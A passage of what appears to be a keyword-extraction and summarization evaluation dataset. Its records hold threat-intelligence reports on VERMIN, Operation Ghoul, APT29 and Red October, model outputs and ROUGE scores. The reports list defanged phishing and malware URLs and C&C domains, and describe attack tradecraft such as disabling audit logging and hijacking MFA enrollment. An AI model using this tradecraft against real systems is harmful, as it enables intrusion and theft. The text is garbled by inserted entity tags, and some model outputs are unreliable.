RAT; remote access tool; Ukrainian Ministry of Defense; 2014; the malware samples; use; the infrastructure; a modestly sized campaign; late 2015; both Quasar RAT; VERMIN; the samples; the infrastructure; analysis; interdomain malware; the malware; a decoy document; user; the documents; the malware; a decoy document; a sandbox run; the malware hash; C2; the infrastructure; the infrastructure; the IOCs; IOCs; the VERMIN malware; the campaign; a tweet; the malware; a tweet; a decoy document; the Ukraine Ministry of Defense; a lure; the RAT; the initial samples; the malware; a DLL; the sandbox; the infrastructure; the malware; targets; activity; 2014; the links; the activity; the VERMIN malware; the analysis; the infrastructure; the investigation.", "ref_text": "<START-1>Palo Alto Networks Unit 42 has discovered a new malware family written using the Microsoft .NET Framework which the authors call \u201cVERMIN\u201d; an ironic term for a RAT (Remote Access Tool). Cursory investigation into the malware showed the attackers not only had flair for malware naming, but also for choosing interesting targets for their malware: nearly all the targeting we were able to uncover related to activity in Ukraine. Pivoting further on the initial samples we discovered, and their infrastructure, revealed a modestly sized campaign going back to late 2015 using both Quasar RAT (url and VERMIN. This blog shows the links between the activity observed, a walkthrough of the analysis of the VERMIN malware, and IOCs for all activity discovered. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.6637168141592921, "gpt3/lexical/rouge_rouge2": 0.42857142857142855, "gpt3/lexical/rouge_rougeL": 0.44247787610619466, "gpt3/lexical/rouge_rougeLsum": 0.44247787610619466, "gpt3_generated_text": ["Palo Alto Networks' Unit 42 has discovered a new malware family called \"VERMIN\" which is a Remote Access Tool (RAT) written using the Microsoft.NET Framework. The malware is notable for its use of the Ukrainian Ministry of Defense as a lure. The researchers found a modestly sized campaign dating back to late 2015 that used both Quasar RAT and VERMIN. Analysis of the malware samples and their infrastructure revealed a connection between the activity observed and the VERMIN malware. The researchers were able to identify IOCs for all the activity discovered. The article provides a detailed analysis of the VERMIN malware and the campaign."]}, {"split_name": "val", "sample_id": "val_103", "prompt_text": "Extract the keywords: 2016/8/17Operation [PERSON] Ghoul : targeted attacks on industrial and engineering organizations - SecurelistOperation Ghoul : targeted attacks on industrial and engineering organizationsBy [PERSON] Mohamad [PERSON] Amin [PERSON] Hasbini on [DATE] August 17 , [DATE] 2016 . 8:56 amRESEARCHMALWARE [ORG] PHISHING [ORG] SOCIAL [ORG] ENGINEERING SPYWAREMohamad [ORG] Amin [ORG] Hasbini [ORG] Senior Security Researcher@MaHasbiniIntroductionKaspersky Lab has observed new waves of attacks that started on [DATE] the [DATE] 8th [DATE] and [DATE] the [DATE] 27th [DATE] of [DATE] June [DATE] 2016 . These have been highly active in [LOC] the [LOC] Middle [LOC] East region and unveiled ongoing targeted attacks in multiple regions . The attackers try to lure targets through spear phishing emails that include compressed executables . The malware collects all data such as passwords , keystrokes and screenshots , then sends it to the attackers . Tweet#OpGhoul targeting organizations in [QUANTITY] 30 + countriesWe found that the group behind this campaign targeted mainly industrial , engineering and manufacturing organizations in moreurl [PERSON] Ghoul : targeted attacks on industrial and engineering organizations - Securelistthan [CARDINAL] 30 countries . In total , [CARDINAL] over [CARDINAL] 130 organizations have been identified as victims of this campaign . Using [ORG] the [ORG] Kaspersky [ORG] Security [ORG] Network ( [ORG] KSN ) and artifacts from malware files and attack sites , we were able to trace the attacks back to [DATE] March [DATE] 2015 . [ORG] Noteworthy is that since the beginning of their activities , the attackers \u2019 motivations are apparently financial , whether through the victims \u2019 banking accounts or through selling their intellectual property to interested parties , most infiltrated victim organizations are considered SMBs ( Small to Medium size businesses , [CARDINAL] 30 [CARDINAL] 300 employees ) , the utilization of commercial off the shelf malware makes the attribution of the attacks more difficult . TweetIn total , [CARDINAL] over [CARDINAL] 130 organizations have been identified as victims of [ORG] Operation [ORG] Ghoul # OpGhoulIn ancient [ORG] Folklore , the [PERSON] Ghoul is an evil spirit associated with consuming human flesh and hunting kids , originally a [NORP] Mesopotamian demon . [DATE] Today , the term is sometimes used to describe a greedy or materialistic individual . [ORG] Main infection vector : malicious emailsThe following picture represents emails that are being used to deliver malware to the victims , in what looks like a payment document . The e mails sent by attackers appear to be coming from a bank in the [GPE] UAE , [GPE] the [GPE] Emirates [GPE] NBD , and include a [CARDINAL] 7z file with malware . In other cases , victims received phishing links . A quick analysis of the email headers reveals fake sources being utilised to deliver the emails to victims.url [PERSON] Ghoul : targeted attacks on industrial and engineering organizations - SecurelistMalicious attachmentsIn the case of spear phishing emails with an attachment , the [CARDINAL] 7z does not contain payment instructions but a malware executable ( EmiratesNBD_ADVICE.exe ) . We have observed executables and executives of targeted organizations , most likely because the attackers hope to get access to core intelligence , controlling accounts and other interesting information from people who have the following positions or similar : Chief Executive Officer Chief Operations Officer General Manager General Manager , Sales and Marketing Deputy General Manager Finance and [PERSON] Admin [PERSON] Managerurl [PERSON] Ghoul : targeted attacks on industrial and engineering organizations - SecurelistBusiness Development Manager Head of Logistics EngineerTechnical detailsMalware functionalityThe malware is based on the [GPE] Hawkeye commercial spyware , which provides a variety of tools for the attackers , in addition to malware anonymity from attribution . It initiates by self deploying and configuring persistence , while using anti debugging and timeout techniques , then starts collecting interesting data from the victim \u2019s device , including : Keystrokes Clipboard data [ORG] FileZilla ftp server credentials [ORG] Account data from local browsers [ORG] Account data from local messaging clients ( Paltalk , Google talk , [ORG] AIM \u2026 ) Account data from local email clients ( Outlook , Windows Live mail \u2026 ) [ORG] License information of some installed [ORG] applicationsTweet#OpGhoul malware collects all data such info@ozlercelikkapi[.]com eminfo@eminenture[.]comBoth ozlercelikkapi[.]com and eminenture[.]com seem to belong to compromised organisations operating in manufacturing and information from the victim \u2019s PC . This information includes compromised device running multiple malware campaigns . Victim informationVictim organizations are distributed in different countries worldwide with attackers focused on certain countries more than others : url [PERSON] Ghoul : targeted attacks on industrial and engineering organizations - SecurelistNumber of Victim Organisations by [ORG] CountryCountries marked as \u201c others \u201d have [CARDINAL] less [CARDINAL] than [CARDINAL] three victim organizations each , they are : [GPE] Switzerland , [GPE] Gibraltar , [GPE] USA , [GPE] Sweden , [GPE] China , [GPE] France , [GPE] Azerbaijan , [GPE] Iraq , [GPE] Turkey , [GPE] Romania , [GPE] Iran , [GPE] Iraq and [GPE] Italy . Victim industry informationVictim industry types were also indicators of targeted attacks as attackers were looking to infiltrate organizations that belong to the product life cycle of multiple goods , especially industrial [CARDINAL] # travel targets of [CARDINAL] # OpGhoulTweeturl [PERSON] Ghoul : targeted attacks on industrial and engineering organizations - SecurelistNumber of Victim Organizations by Industry TypeVictim industry descriptionIndustrialEngineeringShippingPharmaceuticalManufacturingTradingEducationTourismTechnology / ITUnknownPetrochemical , naval , military , aerospace , heavy machinery , solar energy , steel , pumps , [ORG] International freight shipping [ORG] Production / research of pharmaceutical and beauty products [ORG] Furniture , decor , textiles Industrial , electronics and food trading Training centers , universities , Providers of IT technologies and consulting services Unidentified victimsThe last attack wavesKaspersky Lab user statistics indicate the new waves of attacks that started in [DATE] June [DATE] 2016 are focused on certain countries moreurl others . Operation [PERSON] Ghoul : targeted attacks on industrial and engineering organizations - Securelist#opghoul highly active in # [MONEY] MiddleEastTweetHundreds of detections have been reported by [PERSON] Kaspersky [PERSON] Lab users\u037e 70 % of the attacked users were found in [GPE] the [GPE] United [GPE] Arab [GPE] Emirates alone , the other [PERCENT] 30 % were distributed in [GPE] Russia , [GPE] Malaysia , [GPE] India , [GPE] Jordan , [GPE] Lebanon , [GPE] Turkey , [GPE] Algeria , [GPE] Germany , [GPE] Iran , and although they are taken down quickly , [CARDINAL] more [CARDINAL] than [CARDINAL] 150 user accounts were identified as victims of the phishing links sent by the attackers . [NORP] Victims were connecting from the following devices and inserting their credentials , a reminder that phishing attacks do work on all platforms : [ORG] Windows [ORG] Mac [ORG] OS [ORG] X [ORG] Androidurl [ORG] Ghoul : targeted attacks on industrial and engineering organizations - SecurelistThe malware files are detected using the following heuristic signatures : [GPE] Trojan . MSIL.ShopBot.ww [ORG] Trojan.Win32.Fsysna.dfah [ORG] Trojan . Win32.GenericConclusionOperation [PERSON] Ghoul is one of the many attacks in the wild targeting industrial , manufacturing and engineering organizations , [PERSON] Kaspersky [PERSON] Lab recommends users to be extra cautious while checking and opening emails and attachments . In addition , privileged users need to be well trained and ready to deal with cyber threats\u037e failure in this is , in most cases , the cause behind private or corporate data leakage , reputation and financial loss . Indicators of [ORG] CompromiseThe following are common among the different malware infections\u037e the presence of these is an indication of a possible infection . Filenames and paths related to malwareC:\\Users\\%UserName%\\AppData\\Local\\Microsoft\\Windows\\bthse rv.exe C:\\Users\\%UserName%\\AppData\\Local\\Microsoft\\Windows\\BsBh vScan.exe [GPE] C:\\Users\\%UserName%\\AppData\\Local\\Client\\WinHttpAutoProxy Sync.exe C:\\Users\\%UserName%\\AppData\\Local\\Client\\WdiServiceHost.ex e [ORG] C:\\Users\\%UserName%\\AppData\\Local\\Temp\\AF7B1841C6A70C 858E3201422E2D0BEA.dat [ORG] C:\\Users\\%UserName%\\AppData\\Roaming\\Helper\\Browser.txt [ORG] C:\\Users\\%UserName%\\AppData\\Roaming\\Helper\\Mail.txt C:\\Users\\%UserName%\\AppData\\Roaming\\Helper\\Mess.txt C:\\Users\\%UserName%\\AppData\\Roaming\\Helper\\OS.txt [GPE] C:\\ProgramData\\Mails.txt apple recovery[.]us security block[.]com com wn[.]in Mercadojs[.]comObserved phishing URLshxxp://free.meedlifespeed[.]com / ComCast/ hxxp://emailreferentie.appleid.apple.nl.468213579[.]com/ hxxp://468213579[.]com / emailreferentie.appleid.apple.nl / emailveriurl [PERSON] Ghoul : targeted attacks on industrial and engineering organizations - Securelistficatie 40985443 / home / login.php hxxp://verificatie.appleid.apple.nl.referentie.357912468[.]com / em ailverificatie 40985443 / home / lo \u2026 hxxp://customer.comcast.com.aboranian[.]com / login hxxp://apple recovery[.]us/ hxxp://apple.security [ORG] block[.]com / Apple%20   % 20My%20Apple%20ID.html hxxp://cgi.ebay.com wn[.]in / itm/2000 [ORG] Jeep Wrangler Sport 4\u00d74 / ? ViewItem&item=17475607809 hxxp://https.portal.apple.com.idmswebauth.login.html.appidkey.05 bfd052461b0b3ab1bc2b445a[.]com / login.html and [DATE] April [DATE] 2016 : hxxp://glazeautocaree[.]com / proforma invoice.exe hxxp://brokelimiteds[.]in / cdn / images / bro.exe hxxp://brokelimiteds[.]in / cdn / images / onowu.exe hxxp://brokelimiteds[.]in / cdn / images / obe.exe hxxp://brokelimiteds[.]in / wp admin / css / upload / order.exe hxxp://brokelimiteds[.]in / wp admin / css / upload / orders.exe hxxp://papercuts[.]info / [ORG] SocialMedia / java.exe hxxp://studiousb[.]com / mercadolivrestudio / f.zip hxxp://copylines[.]biz / lasagna / gate.php?request = trueFor more information on how you can protect your business from similar attacks , please visit this post from [ORG] Kaspersky [ORG] Business . Related PostsPROJECTSAURON : [ORG] THE [ORG] RISE [ORG] OF [ORG] MISSING [ORG] PIECEurl", "generated_text": "Operation Ghoul; over 130; organizations; the Middle East; March 2015; spear phishing emails; data; keystrokes; screenshots; the malware; a bank; Emirates NBD; samples; the attackers; the UAE; the UAE; NBD; the emails; the malicious attachment; the 7z; a 7z file; the email headers; the 7z; a personal computer; the victim; the email; data; the malware; data; commands; attribution; scripts; time; indicators; compromise; targets.", "ref_text": "<START-1>The report analyzes an ongoing targeted cyberespionage campaign called Operation Ghoul that has been active since at least March 2015. The attackers send spearphishing emails containing malware that collects sensitive data from victims. Over 130 organizations have been identified as targets, mostly industrial, engineering, and manufacturing companies in the Middle East and Asia. The malware is based on the Hawkeye commercial spyware and exfiltrates data like keystrokes, screenshots, credentials, etc. back to the attackers. Technical analysis is provided on the malware functionality, command and control infrastructure, victimology, and indicators of compromise. The attacks are focused on stealing sensitive data from companies involved in making industrial equipment and hardware, likely for financial gain. The report concludes with recommendations for protection against similar targeted attacks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4748201438848921, "gpt3/lexical/rouge_rouge2": 0.18115942028985507, "gpt3/lexical/rouge_rougeL": 0.2589928057553957, "gpt3/lexical/rouge_rougeLsum": 0.2589928057553957, "gpt3_generated_text": ["Operation Ghoul is a targeted attack campaign that started in June 2016 and has been highly active in the Middle East region. The attackers use spear phishing emails with malicious attachments to target industrial, engineering, and manufacturing organizations in over 30 countries. The malware collects data such as passwords, keystrokes, and screenshots, and sends it to the attackers. The motivation behind these attacks appears to be financial gain, either through accessing victims' banking accounts or selling their intellectual property. The attackers primarily target small to medium-sized businesses, making attribution more difficult. The malware used in these attacks is based on the Hawkeye commercial spyware, which provides the attackers with various tools and anonymity. The victim organizations are distributed worldwide, with certain countries being more heavily targeted than others. The industries targeted by the attackers are also indicators of their motives, as they focus on organizations involved in the product life cycle of multiple goods."]}, {"split_name": "val", "sample_id": "val_104", "prompt_text": "Extract the keywords: www.mandiant.com /resources / blog / apt29 - continues - targeting - microsoft You Ca n\u2019t Audit Me : APT29 Continues [NORP] Targeting [ORG] Microsoft 365APT29 is a [NORP] Russian espionage group that [ORG] Mandiant has been tracking since at least 2014 and is likely sponsored by [ORG] the [ORG] Foreign [ORG] Intelligence [ORG] Service ( [ORG] SVR ) . Mandiant continues to identify APT29 operations targeting [GPE] the [GPE] United States ' ( [GPE] US ) interests , and those of [ORG] NATO and partner countries . Despite the publicization of multiple APT29 operations , they continue to be extremely prolific . In [DATE] 2022 , APT29 has focused on organizations responsible for influencing and crafting the foreign policy of [ORG] NATO countries . This has included multiple instances where APT29 revisited victims they had compromised years , or sometimes [DATE] only [DATE] months beforehand . This persistence and aggressiveness are indicative of sustained interest in this information and strict tasking by [ORG] the [ORG] Russian [ORG] Government . [ORG] Mandiant has observed APT29 continue to demonstrate exceptional operational security and advanced tactics targeting [ORG] Microsoft 365 . We are highlighting several newer TTPs used by APT29 in recent operations . Disabling LicensesMicrosoft 365 uses a variety of licensing models to control an individual user \u2019s access to services in the [ORG] Microsoft [PRODUCT] 365 suite of products . The licenses can also dictate security and compliance settings such [DATE] as1/3log retention and [ORG] Mail [ORG] Items [ORG] Accessed logging within [ORG] Purview [ORG] Audit . The most common licenses are E1 , [GPE] E3 , and E5 ; however , there are a variety of other license plans and granular add - ons that make licensing in M365 complex . For a threat actor , [CARDINAL] one of the most troublesome logging features is [ORG] Purview [ORG] Audit , formerly [ORG] Advanced [ORG] Audit . This feature , available with E5 licenses and certain add - ons , enables [ORG] the [ORG] Mail [ORG] Items Accessed audit . Mail Items Accessed records the user - agent string , timestamp , IP address , and user each time a mail item is accessed . The audit records any type of mail access whether it is using the Graph API , Outlook , a browser , or other methodology . This is a critical log source to determine if a threat actor is accessing a particular mailbox , as well as to determine the scope of exposure . Further , it is the only way to effectively determine access to a particular mailbox when the threat actor is using techniques like [ORG] Application [ORG] Impersonation or [ORG] the [ORG] Graph [ORG] API.Mandiant has observed APT29 disabling [ORG] Purview [ORG] Audit on targeted accounts in a compromised tenant . Once disabled , they begin targeting the inbox for email collection . At this point , there is no logging available to the organization to confirm which accounts the threat actor targeted for email collection and when . Given APT29 \u2019s targeting and TTPs [ORG] Mandiant believes that email collection is the most likely activity following disablement of [ORG] Purview [ORG] Audit . We have updated our white paper , [ORG] Remediation [ORG] and [ORG] Hardening [ORG] Strategies for [ORG] Microsoft [PRODUCT] 365 to include more details on this technique as well as detection and remediation advice . Additionally , we have updated the Azure AD Investigator with a new module to report on users with advanced auditing disabled . [ORG] MFA [ORG] Takeover of Dormant AccountsMulti - factor authentication ( [ORG] MFA ) is a crucial tool that organizations can deploy to thwart account takeover attacks by threat actors . By requiring users to provide both something they know and something they have , organizations can significantly reduce the risk of account compromise . [ORG] MFA itself , however , is not a silver bullet . [ORG] Mandiant has previously discussed how threat actors abuse push - based [ORG] MFA to spam users with notifications until they eventually accept the prompt and allow the threat actor access . [ORG] Microsoft has recently announced that they will roll out [ORG] MFA push notification with number matching to combat this . [ORG] Mandiant has begun to observe another trend where threat actors , including APT29 , take advantage of the self - enrollment process for [ORG] MFA in [ORG] Azure [ORG] Active [ORG] Directory and other platforms . When an organization [ORDINAL] first enforces [ORG] MFA , most platforms allow users to enroll their [ORDINAL] first [ORG] MFA device at the next login . This is often the workflow chosen by organizations to roll out [ORG] MFA . In Azure AD and other platform \u2019s default configuration , there are no additional enforcements on the [ORG] MFA enrollment process . In other words , anyone with knowledge of the username and password can access the account from any location and any device to enroll [ORG] MFA , so long as they are the [ORDINAL] first person to do it . In [CARDINAL] one instance , APT29 conducted a password guessing attack against a list of mailboxes they had obtained through unknown means . The threat actor successfully guessed the password to an account that had been setup , but never used . Because the account was dormant , [ORG] Azure [ORG] AD prompted APT29 to enroll in [ORG] MFA . Once enrolled , APT29 was able to use the account to access the organization \u2019s \u2019 VPN infrastructure that was using Azure AD for authentication and [ORG] MFA . Mandiant recommends that organizations ensure all active accounts have [CARDINAL] at [CARDINAL] least [CARDINAL] one [ORG] MFA device enrolled and work with their platform vendor to add additional verifications to the [ORG] MFA enrollment process . [ORG] Microsoft [ORG] Azure AD2/3recently rolled out a feature to allow organizations to enforce controls around specific actions such as [ORG] MFA device enrollment . Using conditional access , Organizations can restrict the registration of [ORG] MFA devices to only trusted locations , such as the internal network , or trusted devices . Organizations can also choose to require [ORG] MFA to enroll [ORG] MFA . To avoid the chicken - and - egg situation this creates , help desk employees can issue [WORK_OF_ART] Temporary [WORK_OF_ART] Access [WORK_OF_ART] Passes to employees when they [ORDINAL] first join or if they lose their [ORG] MFA device . The pass can be used for a limited time to login , bypass [ORG] MFA , and register a new [ORG] MFA device . Focus on Operational SecurityAPT29 continues to demonstrate exceptional operational security and evasion tactics . In addition to the use of residential proxies to obfuscate their last mile access to victim environments , [ORG] Mandiant has observed APT29 turn to [ORG] Azure [ORG] Virtual [ORG] Machines . The virtual machines used by APT29 exist in [GPE] Azure subscriptions outside of the victim organization . Mandiant does not know if these subscriptions have been compromised or purchased by APT29 . Sourcing their last - mile access from trusted [ORG] Microsoft [ORG] IP addresses reduces the likelihood of detection . Because [ORG] Microsoft 365 itself runs on Azure , the Azure AD Sign - In and Unified Audit Logs already contain many [ORG] Microsoft [ORG] IP addresses and it can be hard to quickly determine if an [ORG] IP address belongs to a malicious VM or a backend M365 service . From [ORG] Mandiant \u2019s own observation it also appears that [ORG] Microsoft owned [ORG] IP addresses greatly reduce the risk of detection by [ORG] Microsoft \u2019s risky sign - ins and risky users reports . [ORG] Mandiant has also observed APT29 mix benign administrative actions with their malicious ones . For example , in a recent investigation APT29 gained access to a global administrator account in [EVENT] Azure [EVENT] AD . They used the account to backdoor a service principal with [ORG] ApplicationImpersonation rights and start collecting email from targeted mailboxes in the tenant . To accomplish this , APT29 added a new certificate , or [ORG] Key [ORG] Credential , to the service principal . Once added , APT29 was able to authenticate to Azure AD as [ORG] the [ORG] Service [ORG] Principal and use its roles to collect email . To blend in , APT29 created the certificate with a Common Name ( CN ) that matched the display name of the backdoored service principal . In addition to this , they also added a new [PRODUCT] Application [PRODUCT] Address [PRODUCT] URL to the service principal . The address they added was completely benign , not needed to facilitate their malicious activities , and was related to the functionality of the application as documented by the vendor . This action demonstrates the extremely high level of preparation that APT29 takes and the extent to wish they try to masquerade their actions as legitimate . OutlookAPT29 continues to develop its technical tradecraft and dedication to strict operational security . [ORG] Mandiant expects that APT29 will stay apace with the development of techniques and tactics to access [ORG] Microsoft 365 in novel and stealthy ways.3/3", "generated_text": "APT29; Russian espionage; at least 2014; organizations; NATO; partner countries; the United States; interest; security; the Russian Government; Microsoft 365; the US; individuals; access; logging; Purview Audit; the mailbox; email collection; the malware; the inbox; Users; authentication; multi-factor authentication; MFA; Dormant Accounts; Analysis; the threat actor; a compromised tenant; Exchange; a compromised mailbox; theft; data; Microsoft; a second attack; a malicious attachment; a domain; files; the domain; an email address; servers; malware; Targeting; organizations; use.", "ref_text": "<START-1>Here is a summary of the key points from the Mandiant report on APT29's targeting of Microsoft 365: The Russian state-sponsored hacking group APT29 continues to aggressively target organizations involved in shaping NATO countries' foreign policy. They frequently re-compromise victims they've breached previously. APT29 is demonstrating advanced tactics for evading detection and masking their activities in Microsoft 365 environments. They have been observed disabling logging features like Purview Audit on compromised accounts before collecting emails. This prevents logs that would show their mailbox access. The group is taking over dormant Microsoft 365 accounts by resetting passwords and quickly enrolling multi-factor authentication. This bypasses MFA protections. To hide their last-mile attacks, APT29 uses Azure virtual machines outside the victim's subscription. The Microsoft IP addresses are less likely to raise alerts. The group intersperses benign admin actions on accounts/apps among their malicious activity. This masquerades adversarial actions as legitimate administrator behavior. Overall, APT29 continues honing their tradecraft for stealthy Microsoft 365 intrusions. They rapidly adopt new techniques for accessing cloud environments while erasing their tracks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4606741573033708, "gpt3/lexical/rouge_rouge2": 0.11299435028248588, "gpt3/lexical/rouge_rougeL": 0.24157303370786518, "gpt3/lexical/rouge_rougeLsum": 0.24157303370786518, "gpt3_generated_text": ["The article discusses the continued targeting of Microsoft 365 by the Russian espionage group APT29. Mandiant has been tracking APT29 since 2014 and believes they are likely sponsored by the Russian Foreign Intelligence Service (SVR). Despite multiple publicized operations, APT29 remains prolific and has focused on organizations responsible for influencing the foreign policy of NATO countries in 2022. Mandiant has observed APT29 demonstrating exceptional operational security and advanced tactics targeting Microsoft 365. They have highlighted two newer tactics used by APT29: disabling Purview Audit and taking over dormant accounts through multi-factor authentication (MFA). Disabling Purview Audit allows APT29 to target inboxes for email collection without leaving any logging available to the organization. APT29 also takes advantage of the self-enrollment process for MFA in Azure Active Directory and other platforms, allowing them to access accounts and enroll in MFA if they are the first person to do so. Mandiant provides detection and remediation advice for these tactics. Overall, APT29's continued targeting of Microsoft 365 poses a threat to organizations and their data security."]}, {"split_name": "val", "sample_id": "val_105", "prompt_text": "Extract the keywords: \u201c Red [DATE] October \u201d . Detailed Malware Description 2 . Second Stage of Attacksecurelist.com/red-october-detailed-malware-description-2-second-stage-of-attack/36842/GReATFirst stage of attackSecond stage of attack1 . [PERSON] Modules , general overviewModule frameworkThe main component of [ORG] Sputnik implements a framework for executing the \u201c tasks \u201d that are provided by its [ORG] C&C servers . Most of the tasks are provided as [CARDINAL] one - time PE DLL libraries that are received from the server , executed in memory and then immediately discarded . Several tasks need to be constantly present , i.e. waiting for the [ORG] iPhone or [ORG] Nokia mobile to connect . These tasks are provided as [ORG] PE [ORG] EXE files and are installed to the infected machine . Persistent tasksOnce a [ORG] USB drive is connected , search and extract files by mask / format , including deleted files . Deleted files are restored using a built in file system parser Wait for an [ORG] iPhone or a [ORG] Nokia phone to be connected . Once connected , retrieve information about the phone , its phone book , contact list , call history , calendar , SMS messages , browsing history Wait for a [FAC] Windows [FAC] Mobile phone to be connected . Once connected , infect the phone with a mobile version of the [ORG] Sputnik main component Wait for a specially crafted [ORG] Microsoft [ORG] Office or [ORG] PDF document and execute a malicious payload embedded in that document , implementing a [CARDINAL] one - way covert channel of communication that can be used to restore control of the infected machine Record all the keystrokes , make screenshots [ORG] Execute additional encrypted modules according to a pre - defined schedule Retrieve e - mail messages and attachments from [ORG] Microsoft [ORG] Outlook and from reachable mail servers using previously obtained credentialsOne - time tasksCollect general software and hardware environment information1/16Collect filesystem and network share information , build directory listings , search and retrieve files by mask provided by the [ORG] C&C server [ORG] Collect information about installed software , most notably [ORG] Oracle [ORG] DB , [ORG] RAdmin , [ORG] IM software including [GPE] Mail . [PRODUCT] Ru agent , drivers and software for [FAC] Windows [FAC] Mobile , [ORG] Nokia , [ORG] SonyEricsson , [ORG] HTC , [ORG] Android phones , [ORG] USB drives Extract browsing history from [GPE] Chrome , Firefox , Internet Explorer , [ORG] Opera [ORG] Extract saved passwords for Web sites , [ORG] FTP servers , mail and [ORG] IM accounts Extract Windows account hashes , most likely for offline cracking [ORG] Extract [ORG] Outlook account information [ORG] Determine the external [ORG] IP address of the infected machine [PRODUCT] Download files from [ORG] FTP servers that are reachable from the infected machine ( including those that are connected to its local network ) using previously obtained credentials Write and/or execute arbitrary code provided within the task Perform a network scan , dump configuration data from [GPE] Cisco devices if available [PERSON] Perform a network scan within a predefined range and replicate to vulnerable machines using the [CARDINAL] MS08 - 067 vulnerability Replicate via network using previously obtained administrative credentialsModule [ORG] GroupsGroup nameReconPasswordEmailUSB driveDescritionModules of this group designed to be used during [ORDINAL] first stage of cyberattack right after initial infiltration . Their main purpose is to collect general information about target system which helps locate and identify the infected machine , estimate potential value of current computer data and define which other modules should be pushed next . Also , these modules collect initial easy - to - get type of information such as browser history , browser cached credentials and [ORG] FTP client settings . This group of modules is designed to steal credentials from various applications and resources , from Mail.ru Agent ( popupal free app from mail.ru ) to MS Outlook credentials and Windows account hashes ( including cached [LOC] Windows [LOC] Domain account hashes ) . Capable of using low - level and direct disk access to copy protected files . This group serves stealing emails from local MS Outlook storage or remote POP3 / IMAP mail server . It \u2019s capable of dumping full email bodies with headers , saving attachments with predefined file extensions . This group is used to steal files from attached [ORG] USB devices . It monitors [ORG] USB device events and starts every time new device is attached . It can copy files from predefined extension list , size and age . This group capable of recognition , restoration and copying already deleted files of [ORG] MS [ORG] Office document formats by using own [ORG] FAT - based filesystem parser . KeyboardThis group is dedicated to recording keystrokes , grabbing text from password input fields and making screencaptures . [ORG] Persistence [ORG] Current group contains installer and payload code to plant a plugin in popularapplications such as [ORG] MS [ORG] Office or Adobe Reader . The backdoor code is activated when specially crafted document is opened on target machine . This is used to regain lost access on a machine in case of unexpected loss of control ( [ORG] C&C server takedown or local malware cleaning).2/16SpreadingMobileModules of this group are used to scan for other hosts on the network , fingerprint them and then infect via [PRODUCT] MS08 - 067 or a list of stolen admin credentials . A module from this group is capable of dumping [GPE] Cisco network router configuration via [DATE] SNMP commands and embedded TFTP server . [GPE] Mobile group is used to dump all valuable information about locally attached mobile device . It is capable of copying contact information , calendars , SMS and Emails databases and many other private data . These modules are capable of checking if a device was jailbroken . Exfiltration While some of other modules work in \u201c offline \u201d mode , collect and store data locally , this group of modules transfers all collected data to the [ORG] C&C server . [PERSON] Modules of this group are capable of reaching [ORG] FTP servers , remote network shares as well as local disk drives and copy files from these resources . Unlike [ORG] Recon data collection modules these modules are designed to run repeatedly and bring only new valuable data . Missing [PERSON] ModulesGroup nameUSB InfectionDescritionThere are modules that copy data files ( such as execution logs ) related to current malware family from [ORG] USB drives . However , we have n\u2019t seen a module to infect the [ORG] USB drives yet . We suspect that this module is capable of infecting removable storage , running arbitrary application launch timestamps , enumerates attached usb devices like mobile phones and looks for software from this devices , checks for presence of custom enterprise software , maintains unfinished / unreferenced [ORG] download+execute functionality , sends encrypted collected data at [CARDINAL] one of [ORG] C&C servers ( i.e. nt - windows - online.com;nt - windows- update.com;nt - windows - check.com ) . This module is a Win32 [PERSON] Dll file . C runtime and several other libs statically linked into the executable with various optimizations enabled . All functionality is in [ORG] DllMain function , no export names defined . Compiled with MS Visual C++ 2005.Sequence of systems monitoring tasks1 . Gathers startup information , select environment variables and values % windir%,%username% , % userdomain% , % computername%)2 . Opens target directory c : windowsprefetch , records all entries in the directory ofapplications recently run along with timestamp , i.e. PREFETCH DEFRAG.EXE-273F131E.pf.2012 - 10 - 31 18:32:37 PREFETCH DUMPBIN.EXE-0751B17C.pf.2012 - 11 - 01 23:45:393 . Loops through registry , attempts to access and record all recently used applicationdata , i.e. C : Program FilesCommon FilesJavaJava [GPE] Updatejusched.exe , REG_SZ , Java(TM ) Update Scheduler C : Documents and SettingspLocal SettingsApplication DataGoogleUpdateGoogleUpdate.exe , REG_SZ , Google Installer C : Program FilesMessengermsmsgs.exe , REG_SZ , [PERSON] Windows [PERSON] Messenger4 . Attempts to access and record a set of hardcoded registry keys related to enterprisesoftware . Attempts to access and record related keys and values . Reports on success and failure of related key and value access , i.e. [ORG] REG [ORG] ORACLE * CHECK ( [CARDINAL] 1 ) SoftwareOracleSun RayClientInfoAgentDisconnectActions@Default - > REG_SZ : \u201d \u201d ( [CARDINAL] 1 ) SoftwareOracleSun RayClientInfoAgentReconnectActions @Default - > REG_SZ:\u201d\u201d5 . Attempts to access and record all registry keys and values related to context menuhandlers and related executable pathnames , i.e. Context MENU * shellexContextMenuHandlers7 - Zip ( 1 ) * shellexContextMenuHandlers7 - Zip@Default - > REG_SZ : \u201c { 23170F69 - 40C1 - 278A- 1000 - 000100020000 } \u201d ( [CARDINAL] 1 ) CLSID{23170F69 - 40C1 - 278A-1000 - 000100020000}@Default - > REG_SZ : \u201c 7 - Zip ShellExtension \u201d ( [CARDINAL] 1 ) CLSID{23170F69 - 40C1 - 278A-1000 - 000100020000}InprocServer32@Default - > REG_SZ : \u201c C : Program Files7-Zip7-zip.dll \u201d ( [CARDINAL] 2 ) CLSID{23170F69 - 40C1 - 278A-1000 - 5/16000100020000}InprocServer32ThreadingModel - > REG_SZ : \u201c Apartment\u201d6 . Attempts to access and record registry keys and values related to auto - startapplications enumerated under the HKCU Run key and all [NORP] HKLMUserinit registry keys , REG_SZ : \u201c C : WINDOWSsystem32VBoxTray.exe \u201d ( [CARDINAL] 2 ) SOFTWAREMicrosoftWindowsCurrentVersionRunSunJavaUpdateSched \u2013 > REG_SZ : \u201c C : Program FilesCommon FilesJavaJava Updatejusched.exe\u201d7 . Attempts to access and record registry keys and values enabling email and webmailaccess under [ORG] HKCUSoftwareVB and [ORG] VBA [ORG] Program [ORG] SettingsWebmailer , [ORG] MSOffice settings , and HKCUSoftwareMail.ruAgentAgent , i.e. REG_MRA [PERSON] Run ( [CARDINAL] 1 ) [ORG] SoftwareMail . RuAgentAgent - > REG_SZ : \u201c 1\u201d8 . Attempts to access and record registry keys and values related to hardcoded list of attached mobile devices and also general [ORG] USB devices and mobile synchronization and contact software . Reports on success and failure of related key and value access , i.e. [PERSON] N2 [PERSON] Run [PERSON] ERROR : ca n\u2019t make RegOpenKey for 